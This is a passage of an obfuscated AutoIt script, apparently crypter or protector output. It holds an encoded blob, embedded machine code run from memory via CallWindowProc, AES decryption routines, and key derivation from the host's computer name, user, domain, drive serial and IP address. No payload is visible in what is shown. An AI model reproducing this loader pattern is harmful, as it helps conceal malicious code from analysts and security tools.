yDImLEkEkcUjekZwikERhcIl0EkIkp0hlkaQiXkRrRYlYEgMusSJt4xJMJNdIy5FEIqNEWhuJDhLAJHVI8JGXIvlEX5yJehJZJINIIZFpIshEiXmJPhJxJE9IrZGsIjpESjGJMxJ/JHdIrpGgIitEaP2JbBL4JNNIApGPeokoEsIke0gIkYd3iWoSgiQcSLSR8iLiRPS+iWIS/iRTSFWR4SLrROzviZ8SECSKXuJFBfokjUhdkdQiFUT76YlDEp4kQkiLkVsi7kQKD4keFwiRhiLtRHByif8SOCTVSDmR2SKmRFQuiWcS5ySWSJGRxSIgREsaiboSKiTgSBeRDSLHRKipiRkSByTdSGCRJiL1RDt+iSkSxiT8SPG9xIWJIhIRJCRIPZEyIqFELzCJUhLjJBZIuZFIImREjD+JLBKQJE5I"
			$W &= "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"
			$W &= "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"
			$W &= "EiUkLkgckaYitETG6IndEnQkH0hLkb0ii0SKcIk+ErUkZkhIkQMi9kQOYYk1ElckuUiGkcEiHUSe4Yn4EpgkEUhpkdkijkSUm4keEock6UjOkVUiKETfjImhEokkDUi/keYiQkRoQYmZEi0kD17iRFS7iRYSYyR8SHeReyLyRGtvicUSMCQBSGeRKyL+RNeriXYSyiSCSMmRfXGJWRJHJPBIrZHUIqJEr5yJpBJyJMBIt5H9IpNEJjaJPxL3JMxINJGlIuVE8XGJ2BIxJBVIBJHHIiNEwxiJlhIFJJpIB5ESIoBE4uuJJxKyJHVICZGDIixFGvokbkhakaAiUkQ71omzEikk40gvkYQiU0XRYwBZASIgRPyxiVsSaiTLXaJEOUqJTBJYJM9I0JHvIqpE+0OJTRIzJIVIRZH5IgJEf1CJPBKfJKhIUZGjIkBEj5KJnRI4JPVeokS22okhEhAk/0jzkdIizUQME4nsEl8kl0hEkRcixESnfok9EmQkXUgZkXMiYESBT4ncEiIkKkiQkYgiRkTuuIkUEt4kXkgLkdsi4EQyOokKEkkkBkgkkVwiwkTTrIliEpEklUjkkXki50XI+iRtSI2R1SJORKlsiVYS9CTqSGWReiKuRAi6iXgSJSQuSByRpiK0RMboid0SdCQfSEuRvSKLRIpwiT4StSRmSEiRAyL2RA5hiTUSVyS5SIaRwSIdRJ7hifgSmCQRSGmR2SKORJSbiR4ShyTpSM6RVSIoRN+MiaESiSQNSL+R5iJCRGhBiZkSLSQPXqJEVLuJFhBew1KXmBHRWovVvCCqqtZLB0A54wJnTyYIJ+Qg3FeAsxecNisBUFjDwAA="
		EndIf
		Local $X = String(_1K($W))
		$H = (StringInStr($X, "87DB") - 3) / 2
		$I = (StringInStr($X, "87C9") - 3) / 2
		$J = (StringInStr($X, "87D2") - 3) / 2
		$K = (StringInStr($X, "87F6") - 3) / 2
		$L = (StringInStr($X, "09C0") - 3) / 2
		$M = (StringInStr($X, "09DB") - 3) / 2
		$N = (StringInStr($X, "09C9") - 3) / 2
		$O = (StringInStr($X, "09D2") - 3) / 2
		$P = (StringInStr($X, "09F6") - 3) / 2
		$Q = (StringInStr($X, "09FF") - 3) / 2
		$R = (StringInStr($X, "09E4") - 3) / 2
		$S = (StringInStr($X, "09ED") - 3) / 2
		$X = Binary($X)
		$G = _W(0, BinaryLen($X), $0, $2)
		$F = DllStructCreate("byte[" & BinaryLen($X) & "]", $G)
		DllStructSetData($F, 1, $X)
		OnAutoItExitRegister("_11")
	EndIf
EndFunc
Func _13($Y)
	$Y = Binary($Y)
	Switch BinaryLen($Y)
		Case 0 To 16
			Local $0Z = 16
		Case 17 To 24
			Local $0Z = 24
		Case Else
			Local $0Z = 32
	EndSwitch
	Local $10 = DllStructCreate("byte[" & $0Z & "]")
	DllStructSetData($10, 1, $Y)
	Return DllStructGetData($10, 1)
EndFunc
Func _15($Y)
	If Not IsDllStruct($F) Then _12()
	$Y = _13($Y)
	Local $11 = DllStructCreate("byte[244]")
	Local $12 = DllStructCreate("byte[" & BinaryLen($Y) & "]")
	DllStructSetData($12, 1, $Y)
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($F) + $J, "ptr", DllStructGetPtr($11), "ptr", DllStructGetPtr($12), "uint", BinaryLen($Y) * 8, "int", 0)
	Return $11
EndFunc
Func _16($Y)
	If Not IsDllStruct($F) Then _12()
	$Y = _13($Y)
	Local $11 = DllStructCreate("byte[244]")
	Local $12 = DllStructCreate("byte[" & BinaryLen($Y) & "]")
	DllStructSetData($12, 1, $Y)
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($F) + $K, "ptr", DllStructGetPtr($11), "ptr", DllStructGetPtr($12), "uint", BinaryLen($Y) * 8, "int", 0)
	Return $11
EndFunc
Func _1C(ByRef $11, ByRef $13, $14)
	If Not IsDllStruct($F) Then _12()
	If Not IsDllStruct($11) Then Return SetError(1, 0, Binary(""))
	$14 = Binary($14)
	Local $15 = Ceiling(BinaryLen($14) / 16) * 16
	If $15 = 0 Then Return SetError(1, 0, Binary(""))
	Local $16 = DllStructCreate("byte[" & $15 & "]")
	DllStructSetData($16, 1, $14)
	Local $17 = DllStructCreate("byte[16]")
	DllStructSetData($17, 1, $13)
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($F) + $O, "ptr", DllStructGetPtr($11), "ptr", DllStructGetPtr($16), "uint", $15, "ptr", DllStructGetPtr($17))
	$13 = DllStructGetData($17, 1)
	Return DllStructGetData($16, 1)
EndFunc
Func _1E(ByRef $11, ByRef $13, $14)
	If Not IsDllStruct($F) Then _12()
	If Not IsDllStruct($11) Then Return SetError(1, 0, Binary(""))
	$14 = Binary($14)
	Local $15 = BinaryLen($14)
	If $15 = 0 Then Return SetError(1, 0, Binary(""))
	Local $16 = DllStructCreate("byte[" & $15 & "]")
	DllStructSetData($16, 1, $14)
	Local $17 = DllStructCreate("byte[16]")
	DllStructSetData($17, 1, $13)
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($F) + $Q, "ptr", DllStructGetPtr($11), "ptr", DllStructGetPtr($16), "uint", $15, "ptr", DllStructGetPtr($17))
	$13 = DllStructGetData($17, 1)
	Return DllStructGetData($16, 1)
EndFunc
Func _1F(ByRef $11, ByRef $13, $14)
	If Not IsDllStruct($F) Then _12()
	If Not IsDllStruct($11) Then Return SetError(1, 0, Binary(""))
	$14 = Binary($14)
	Local $15 = BinaryLen($14)
	If $15 = 0 Then Return SetError(1, 0, Binary(""))
	Local $16 = DllStructCreate("byte[" & $15 & "]")
	DllStructSetData($16, 1, $14)
	Local $17 = DllStructCreate("byte[16]")
	DllStructSetData($17, 1, $13)
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($F) + $R, "ptr", DllStructGetPtr($11), "ptr", DllStructGetPtr($16), "uint", $15, "ptr", DllStructGetPtr($17))
	$13 = DllStructGetData($17, 1)
	Return DllStructGetData($16, 1)
EndFunc
Func _1H(ByRef $11, ByRef $13, $14)
	$14 = _1C($11, $13, $14)
	Local $15 = BinaryLen($14)
	For $18 = $15 To $15 - 16 Step -1
		If BinaryMid($14, $18, 1) = Binary("0x80") Then
			Return BinaryMid($14, 1, $18 - 1)
		EndIf
	Next
	Return $14
EndFunc
Func _1J($Y, $14, $19 = $T)
	$14 = Binary($14)
	If BinaryLen($14) <= 16 Then Return SetError(1, 0, Binary(""))
	Local $13 = BinaryMid($14, 1, 16), $11, $1A
	$14 = BinaryMid($14, 17)
	Switch String($19)
		Case "CFB", $U
			$11 = _15($Y)
			$1A = _1E($11, $13, $14)
		Case "OFB", $V
			$11 = _15($Y)
			$1A = _1F($11, $13, $14)
		Case Else
			$11 = _16($Y)
			$1A = _1H($11, $13, $14)
	EndSwitch
	If BinaryLen($1A) = 0 Then Return SetError(1, 0, Binary(""))
	Return $1A
EndFunc
Func _1K($W)
	If @AutoItX64 Then
		Local $X = "0x89C04150535657524889CE4889D7FCB28031DBA4B302E87500000073F631C9E86C000000731D31C0E8630000007324B302FFC1B010E85600000010C073F77544AAEBD3E85600000029D97510E84B000000EB2CACD1E8745711C9EB1D91FFC8C1E008ACE8340000003D007D0000730A80FC05730783F87F7704FFC1FFC141904489C0B301564889FE4829C6F3A45EEB8600D275078A1648FFC610D2C331C9FFC1E8EBFFFFFF11C9E8E4FFFFFF72F2C35A4829D7975F5E5B4158C389D24883EC08C70100000000C64104004883C408C389F64156415541544D89CC555756534C89C34883EC20410FB64104418800418B3183FE010F84AB00000073434863D24D89C54889CE488D3C114839FE0F84A50100000FB62E4883C601E8C601000083ED2B4080FD5077E2480FBEED0FB6042884C00FBED078D3C1E20241885500EB7383FE020F841C01000031C083FE03740F4883C4205B5E5F5D415C415D415EC34863D24D89C54889CE488D3C114839FE0F84CA0000000FB62E4883C601E86401000083ED2B4080FD5077E2480FBEED0FB6042884C078D683E03F410845004983C501E964FFFFFF4863D24D89C54889CE488D3C114839FE0F84E00000000FB62E4883C601E81D01000083ED2B4080FD5077E2480FBEED0FB6042884C00FBED078D389D04D8D7501C1E20483E03041885501C1F804410845004839FE747B0FB62E4883C601E8DD00000083ED2B4080FD5077E6480FBEED0FB6042884C00FBED078D789D0C1E2064D8D6E0183E03C41885601C1F8024108064839FE0F8536FFFFFF41C7042403000000410FB6450041884424044489E84883C42029D85B5E5F5D415C415D415EC34863D24889CE4D89C6488D3C114839FE758541C7042402000000410FB60641884424044489F04883C42029D85B5E5F5D415C415D415EC341C7042401000000410FB6450041884424044489E829D8E998FEFFFF41C7042400000000410FB6450041884424044489E829D8E97CFEFFFF56574889CF4889D64C89C1FCF3A45F5EC3E8500000003EFFFFFF3F3435363738393A3B3C3DFFFFFFFEFFFFFF000102030405060708090A0B0C0D0E0F10111213141516171819FFFFFFFFFFFF1A1B1C1D1E1F202122232425262728292A2B2C2D2E2F3031323358C3"
	Else
		Local $X = "0x89C0608B7424248B7C2428FCB28031DBA4B302E86D00000073F631C9E864000000731C31C0E85B0000007323B30241B010E84F00000010C073F7753FAAEBD4E84D00000029D97510E842000000EB28ACD1E8744D11C9EB1C9148C1E008ACE82C0000003D007D0000730A80FC05730683F87F770241419589E8B3015689FE29C6F3A45EEB8E00D275058A164610D2C331C941E8EEFFFFFF11C9E8E7FFFFFF72F2C32B7C2428897C241C61C389D28B442404C70000000000C6400400C2100089F65557565383EC1C8B6C243C8B5424388B5C24308B7424340FB6450488028B550083FA010F84A1000000733F8B5424388D34338954240C39F30F848B0100000FB63B83C301E8CD0100008D57D580FA5077E50FBED20FB6041084C00FBED078D78B44240CC1E2028810EB6B83FA020F841201000031C083FA03740A83C41C5B5E5F5DC210008B4C24388D3433894C240C39F30F84CD0000000FB63B83C301E8740100008D57D580FA5077E50FBED20FB6041084C078DA8B54240C83E03F080283C2018954240CE96CFFFFFF8B4424388D34338944240C39F30F84D00000000FB63B83C301E82E0100008D57D580FA5077E50FBED20FB6141084D20FBEC278D78B4C240C89C283E230C1FA04C1E004081189CF83C70188410139F374750FB60383C3018844240CE8EC0000000FB654240C83EA2B80FA5077E00FBED20FB6141084D20FBEC278D289C283E23CC1FA02C1E006081739F38D57018954240C8847010F8533FFFFFFC74500030000008B4C240C0FB60188450489C82B44243883C41C5B5E5F5DC210008D34338B7C243839F3758BC74500020000000FB60788450489F82B44243883C41C5B5E5F5DC210008B54240CC74500010000000FB60288450489D02B442438E9B1FEFFFFC7450000000000EB9956578B7C240C8B7424108B4C241485C9742FFC83F9087227F7C7010000007402A449F7C702000000740566A583E90289CAC1E902F3A589D183E103F3A4EB02F3A45F5EC3E8500000003EFFFFFF3F3435363738393A3B3C3DFFFFFFFEFFFFFF000102030405060708090A0B0C0D0E0F10111213141516171819FFFFFFFFFFFF1A1B1C1D1E1F202122232425262728292A2B2C2D2E2F3031323358C3"
	EndIf
	Local $1B = (StringInStr($X, "89C0") - 3) / 2
	Local $1C = (StringInStr($X, "89D2") - 3) / 2
	Local $1D = (StringInStr($X, "89F6") - 3) / 2
	$X = Binary($X)
	Local $1E = _W(0, BinaryLen($X), $0, $2)
	Local $1F = DllStructCreate("byte[" & BinaryLen($X) & "]", $1E)
	DllStructSetData($1F, 1, $X)
	Local $1G = DllStructCreate("byte[16]")
	Local $1H = StringLen($W)
	Local $1I = DllStructCreate("byte[" & $1H & "]")
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($1F) + $1C, "ptr", DllStructGetPtr($1G), "int", 0, "int", 0, "int", 0)
	DllCall("user32.dll", "int", "CallWindowProc", "ptr", DllStructGetPtr($1F) + $1D, "str", $W, "uint", $1H, "ptr", DllStructGetPtr($1I), "ptr", DllStructGetPtr($1G))
	Local $1J = DllStructGetData(DllStructCreate("uint", DllStructGetPtr($1I)), 1)
	Local $1K = DllStructCreate("byte[" & ($1J + 16) & "]")
	Local $1A = DllCall("user32.dll", "uint", "CallWindowProc", "ptr", DllStructGetPtr($1F) + $1B, "ptr", DllStructGetPtr($1I) + 4, "ptr", DllStructGetPtr($1K), "int", 0, "int", 0)
	_Y($1E, 0, $3)
	Return BinaryMid(DllStructGetData($1K, 1), 1, $1A[0])
EndFunc
Func _1L(ByRef $1L, ByRef $1M)
	$1L = $1M
EndFunc
Func _1M(ByRef $1L, $1M, ByRef $1N)
	$1L[$1M] = $1N
EndFunc
Func _1N(ByRef $1L, ByRef $1M, $1N)
	$1L = $1M[$1N]
EndFunc
Func _1O(ByRef $1L, $1M, ByRef $1N, $1O)
	$1L[$1M] = $1N[$1O]
EndFunc
Func _1P(ByRef $1L, $1P)
	$1L = Number($1P)
EndFunc
Func _1Q(ByRef $1L, $1M, $1P)
	$1L[$1M] = Number($1P)
EndFunc
_12()
Global $1Q = 0
Global $1R[2]
$1R[0] = "0x3CA86772DB0B25CBD8AC911792C2217A9DD04C218DAE0F4261BD76EF512838FBDE2BDA417829E56D62EDE396B376E2CC"
Func _1R(Const $1S, $1T = 0)
	Return BinaryToString(_1J($1R[$1T], $1S))
EndFunc
_1S()
Func _1S()
	_1T(0, False)
	_1R("")
	Local $1L = 0, $1M = 1
	Local $1N[1]
	_1L($1L, $1M)
	_1M($1N, 0, $1L)
	_1N($1L, $1N, 0)
	_1O($1N, 0, $1N, 0)
	_1P($1L, 1)
	_1Q($1N, 0, 1)
EndFunc
Func _1T($1U = 0, $1V = True)
	ReDim $1R[8]
	If $CMDLINE[0] > 0 Then
		$1R[1] = $CMDLINE[1]
	Else
		$1R[1] = ""
	EndIf
	$1R[2] = @ComputerName
	$1R[3] = @UserName
	$1R[4] = @LogonDomain
	$1R[5] = DriveGetSerial("C:")
	$1R[6] = @IPAddress1
	$1R[7] = EnvGet("OS")
	If $1U = "" Then $1U = 1
	If $1U <= 0 Or $1U > UBound($1R) - 1 Then
		$1Q = 1
		$1R[$1Q] = String($1U)
		Return
	EndIf
	If $1R[$1U] = "" And $1V = True Then $1R[$1U] = InputBox("Protected Application", "Please Enter your Password: ", "", "*", 250, 140)
	$1Q = $1U
EndFunc
Global Const $1W = 2
Global Const $1X = 8
Global Const $1Y = 16
Global Const $1Z = 1
Global Const $20 = 2
Global Const $21 = 3
Global Const $22 = 5
Global Const $23 = 1
Global Const $24 = 2
Global Const $25 = 1073741824
Global Const $26 = -2147483648
Global Const $27 = 0
Global Const $28 = 2
Global Const $29 = 0
Global Const $2A = 0
Global Const $2B = 0
Global Const $2C = 1
Global Const $2D = 24
Global Const $2E = -268435456
Global Const $2F = 4
Global Const $2G = 2
Global Const $2H = 1
Global Const $2I = 1
Global Const $2J = 32771
Global Const $2K = 26128
Global Const $2L = 26625
Global Const $2M = 0
Global Const $2N = 7
Global $2O[3]
Func _1U()
	If _25() = 0 Then
		Local $2P = DllOpen("Advapi32.dll")
		If $2P = -1 Then Return SetError(1, 0, False)
		_29($2P)
		Local $2Q = $2D
		Local $2R = DllCall(_28(), "bool", "CryptAcquireContext", "handle*", 0, "ptr", 0, "ptr", 0, "dword", $2Q, "dword", $2E)
		If @error Or Not $2R[0] Then
			Local $2S = @error + 10, $2T = @extended
			DllClose(_28())
			Return SetError($2S, $2T, False)
		Else
			_2B($2R[1])
		EndIf
	EndIf
	_26()
	Return True
EndFunc
Func _1V()
	_27()
	If _25() = 0 Then
		DllCall(_28(), "bool", "CryptReleaseContext", "handle", _2A(), "dword", 0)
		DllClose(_28())
	EndIf
EndFunc
Func _1W($2U, $2V, $2W = $2J)
	Local $2R = 0, $2X = 0, $2Y = 0, $2S = 0, $2T = 0, $2Z = 0
	_1U()
	Do
		$2R = DllCall(_28(), "bool", "CryptCreateHash", "handle", _2A(), "uint", $2W, "ptr", 0, "dword", 0, "handle*", 0)
		If @error Or Not $2R[0] Then
			$2S = @error + 10
			$2T = @extended
			$2Z = -1
			ExitLoop
		EndIf
		$2Y = $2R[5]
		$2X = DllStructCreate("byte[" & BinaryLen($2U) & "]")
		DllStructSetData($2X, 1, $2U)
		$2R = DllCall(_28(), "bool", "CryptHashData", "handle", $2Y, "struct*", $2X, "dword", DllStructGetSize($2X), "dword", $2I)
		If @error Or Not $2R[0] Then
			$2S = @error + 20
			$2T = @extended
			$2Z = -1
			ExitLoop
		EndIf
		$2R = DllCall(_28(), "bool", "CryptDeriveKey", "handle", _2A(), "uint", $2V, "handle", $2Y, "dword", $2H, "handle*", 0)
		If @error Or Not $2R[0] Then
			$2S = @error + 30
			$2T = @extended
			$2Z = -1
			ExitLoop
		EndIf
		$2Z = $2R[5]
	Until True
	If $2Y <> 0 Then DllCall(_28(), "bool", "CryptDestroyHash", "handle", $2Y)
	Return SetError($2S, $2T, $2Z)
EndFunc
Func _1X($30)
	Local $2R = DllCall(_28(), "bool", "CryptDestroyKey", "handle", $30)
	Local $2S = @error, $2T = @extended
	_1V()
	If $2S Or Not $2R[0] Then
		Return SetError($2S + 10, $2T, False)
	Else
		Return True
	EndIf
EndFunc
Func _1Y($31, $32, $2V, $33 = True)
	Switch $2V
		Case $2M
			Local $34 = _2C($32)
			If @error Then Return SetError(@error, -1, @extended)
			If $34 = $2L Then ContinueCase
		Case $2L
			If BinaryLen($31) = 0 Then Return SetError(0, 0, Binary(""))
	EndSwitch
	Local $35 = 0, $2R = 0, $2X = 0, $2S = 0, $2T = 0, $2Z = 0
	_1U()
	Do
		If $2V <> $2M Then
			$32 = _1W($32, $2V)
			If @error Then
				$2S = @error + 100
				$2T = @extended
				$2Z = -1
				ExitLoop
			EndIf
		EndIf
		$2R = DllCall(_28(), "bool", "CryptEncrypt", "handle", $32, "handle", 0, "bool", $33, "dword", 0, "ptr", 0, "dword*", BinaryLen($31), "dword", 0)
		If @error Or Not $2R[0] Then
			$2S = @error + 20
			$2T = @extended
			$2Z = -1
			ExitLoop
		EndIf
		$35 = $2R[6]
		$2X = DllStructCreate("byte[" & $35 + 1 & "]")
		DllStructSetData($2X, 1, $31)
		$2R = DllCall(_28(), "bool", "CryptEncrypt", "handle", $32, "handle", 0, "bool", $33, "dword", 0, "struct*", $2X, "dword*", BinaryLen($31), "dword", DllStructGetSize($2X) - 1)
		If @error Or Not $2R[0] Then
			$2S = @error + 30
			$2T = @extended
			$2Z = -1
			ExitLoop
		EndIf
		$2Z = BinaryMid(DllStructGetData($2X, 1), 1, $35)
	Until True
	If $2V <> $2M Then _1X($32)
	_1V()
	Return SetError($2S, $2T, $2Z)
EndFunc
Func _1Z($31, $32, $2V, $33 = True)
	Switch $2V
		Case $2M
			Local $34 = _2C($32)
			If @error Then Return SetError(@error, -1, @extended)
			If $34 = $2L Then ContinueCase
		Case $2L
			If BinaryLen($31) = 0 Then Return SetError(0, 0, Binary(""))
	EndSwitch
	Local $2R = 0, $2X = 0, $36 = 0, $2S = 0, $2T = 0, $37 = 0, $2Z = 0
	_1U()
	Do
		If $2V <> $2M Then
			$32 = _1W($32, $2V)
			If @error Then
				$2S = @error + 100
				$2T = @extended
				$2Z = -1
				ExitLoop
			EndIf
		EndIf
		$2X = DllStructCreate("byte[" & BinaryLen($31) + 1000 & "]")
		If BinaryLen($31) > 0 Then DllStructSetData($2X, 1, $31)
		$2R = DllCall(_28(), "bool", "CryptDecrypt", "handle", $32, "handle", 0, "bool", $33, "dword", 0, "struct*", $2X, "dword*", BinaryLen($31))
		If @error Or Not $2R[0] Then
			$2S = @error + 20
			$2T = @extended
			$2Z = -1
			ExitLoop
		EndIf
		$37 = $2R[6]
		$36 = DllStructCreate("byte[" & $37 + 1 & "]", DllStructGetPtr($2X))
		$2Z = BinaryMid(DllStructGetData($36, 1), 1, $37)
	Until True
	If $2V <> $2M Then _1X($32)
	_1V()
	Return SetError($2S, $2T, $2Z)
EndFunc
Func _20($31, $2V, $33 = True, $2Y = 0)
	Local $2R = 0, $2X = 0, $2S = 0, $2T = 0, $38 = 0, $2Z = 0
	_1U()
	Do
		If $2Y = 0 Then
			$2R = DllCall(_28(), "bool", "CryptCreateHash", "handle", _2A(), "uint", $2V, "ptr", 0, "dword", 0, "handle*", 0)
			If @error Or Not $2R[0] Then
				$2S = @error + 10
				$2T = @extended
				$2Z = -1
				ExitLoop
			EndIf
			$2Y = $2R[5]
		EndIf
		$2X = DllStructCreate("byte[" & BinaryLen($31) & "]")
		DllStructSetData($2X, 1, $31)
		$2R = DllCall(_28(), "bool", "CryptHashData", "handle", $2Y, "struct*", $2X, "dword", DllStructGetSize($2X), "dword", $2I)
		If @error Or Not $2R[0] Then
			$2S = @error + 20
			$2T = @extended
			$2Z = -1
			ExitLoop
		EndIf
		If $33 Then
			$2R = DllCall(_28(), "bool", "CryptGetHashParam", "handle", $2Y, "dword", $2F, "dword*", 0, "dword*", 4, "dword", 0)
			If @error Or Not $2R[0] Then
				$2S = @error + 30
				$2T = @extended
				$2Z = -1
				ExitLoop
			EndIf
			$38 = $2R[3]
			$2X = DllStructCreate("byte[" & $38 & "]")
			$2R = DllCall(_28(), "bool", "CryptGetHashParam", "handle", $2Y, "dword", $2G, "struct*", $2X, "dword*", DllStructGetSize($2X), "dword", 0)
			If @error Or Not $2R[0] Then
				$2S = @error + 40
				$2T = @extended
				$2Z = -1
				ExitLoop
			EndIf
			$2Z = DllStructGetData($2X, 1)
		Else
			$2Z = $2Y
		EndIf
	Until True
